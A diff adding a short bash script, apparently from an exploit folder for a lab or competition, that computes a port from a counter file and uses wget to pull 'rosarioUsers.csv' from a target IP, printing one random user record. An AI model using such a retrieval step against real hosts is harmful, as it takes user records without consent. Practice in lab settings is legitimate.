@@ -1,0 +1,37 @@
+#!/bin/bash
+
+# Check if an IP address is provided
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target_ip>"
+    exit 1
+fi
+
+TARGET_IP="$1"
+
+# Define the counter directory
+COUNTER_DIR="/home/ncraf/castleexploits"
+
+# Navigate to the counter directory
+cd "$COUNTER_DIR"
+
+# Get the current counter file (most recent 5-digit filename)
+current_counter=$(ls | grep -E '^[0-9]{5}$' | sort -n | tail -n1)
+
+# Verify that a counter file was found
+if [ -z "$current_counter" ]; then
+    echo "Error: No counter file found in $COUNTER_DIR."
+    exit 1
+fi
+
+# Calculate the port number (current counter minus one)
+port=$((current_counter - 1))
+
+# Verify that the port number is within the expected range
+if [ "$port" -lt 60000 ] || [ "$port" -gt 61000 ]; then
+    echo "Error: Calculated port number $port is out of range."
+    exit 1
+fi
+
+# Download the file and extract a random line without saving the file locally
+echo "One record retrieved:"
+wget -qO- "http://$TARGET_IP:$port/rosarioUsers.csv" | shuf -n 1
